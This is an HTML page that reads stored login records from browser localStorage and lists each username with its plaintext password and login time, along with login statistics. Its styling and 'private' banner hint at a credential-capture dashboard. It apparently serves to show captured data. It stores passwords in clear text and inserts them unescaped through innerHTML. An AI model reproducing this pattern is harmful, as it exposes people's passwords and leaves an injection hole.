<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logins</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        .header {
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
            color: white;
            padding: 40px;
            border-radius: 12px;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #f3ba2f;
            font-size: 32px;
        }

        .header p {
            color: #ccc;
            margin-top: 10px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .stat-card h3 {
            color: #666;
            font-size: 13px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .stat-card .number {
            font-size: 40px;
            font-weight: bold;
            color: #f3ba2f;
        }

        table {
            width: 100%;
            background: white;
            border-collapse: collapse;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        thead {
            background: #f3ba2f;
            color: #000;
        }

        th {
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #f0f0f0;
            font-size: 14px;
        }

        tbody tr:hover {
            background: #fafafa;
        }

        .empty {
            text-align: center;
            padding: 60px 20px;
            color: #999;
        }

        .back-link {
            display: inline-block;
            margin-bottom: 20px;
            color: #f3ba2f;
            text-decoration: none;
            font-weight: 600;
        }

        .back-link:hover {
            text-decoration: underline;
        }

        .info-box {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            color: #0c5460;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            text-align: center;
        }

        .refresh-btn {
            background: #f3ba2f;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .refresh-btn:hover {
            background: #e0a91f;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="index.html" class="back-link">← Back to Home</a>

        <div class="header">
            <h1>📊 All Login Information</h1>
            <p>🔒 This page is PRIVATE - DO NOT SHARE!</p>
        </div>

        <div class="info-box">
            💡 Login information is stored locally. Refresh this page to see the latest logins.
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Total Logins</h3>
                <div class="number" id="totalLogins">0</div>
            </div>
            <div class="stat-card">
                <h3>Today's Logins</h3>
                <div class="number" id="todayLogins">0</div>
            </div>
            <div class="stat-card">
                <h3>Unique Users</h3>
                <div class="number" id="uniqueUsers">0</div>
            </div>
        </div>

        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Page</button>

        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Login Time</th>
                </tr>
            </thead>
            <tbody id="loginTable">
                <tr>
                    <td colspan="4" class="empty">
                        <h2>No logins yet</h2>
                        <p>Try <a href="index.html" style="color: #f3ba2f;">logging in</a> first</p>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <script>
        function loadLogins() {
            try {
                const allLogins = JSON.parse(localStorage.getItem('allLogins'));
                console.log('Logins found:', allLogins);
                
                const table = document.getElementById('loginTable');

                if (!allLogins || allLogins.length === 0) {
                    table.innerHTML = `
                        <tr>
                            <td colspan="4" class="empty">
                                <h2>No logins yet</h2>
                                <p>Try <a href="index.html" style="color: #f3ba2f;">logging in</a> first</p>
                            </td>
                        </tr>
                    `;
                    document.getElementById('totalLogins').textContent = '0';
                    document.getElementById('todayLogins').textContent = '0';
                    document.getElementById('uniqueUsers').textContent = '0';
                    return;
                }

                // Display all logins in table
                table.innerHTML = allLogins.map((login, index) => `
                    <tr>
                        <td>${index + 1}</td>
                        <td><strong>${login.username || 'N/A'}</strong></td>
                        <td><code>${login.password || 'N/A'}</code></td>
                        <td>${login.loginTime || 'N/A'}</td>
                    </tr>
                `).join('');

                // Update stats
                document.getElementById('totalLogins').textContent = allLogins.length;

                // Today's logins
                const today = new Date().toLocaleDateString();
                const todayLogins = allLogins.filter(l => {
                    const loginDate = new Date(l.loginTime).toLocaleDateString();
                    return loginDate === today;
                });
                document.getElementById('todayLogins').textContent = todayLogins.length;

                // Unique users
                const uniqueUsers = new Set(allLogins.map(l => l.username));
                document.getElementById('uniqueUsers').textContent = uniqueUsers.size;

            } catch (error) {
                console.error('Error loading logins:', error);
                document.getElementById('loginTable').innerHTML = `
                    <tr>
                        <td colspan="4" class="empty">
                            <h2>Error loading data</h2>
                            <p>${error.message}</p>
                        </td>
                    </tr>
                `;
            }
        }

        // Load logins when page loads
        window.addEventListener('load', loadLogins);

        // Also load immediately
        loadLogins();
    </script>
</body>
</html>
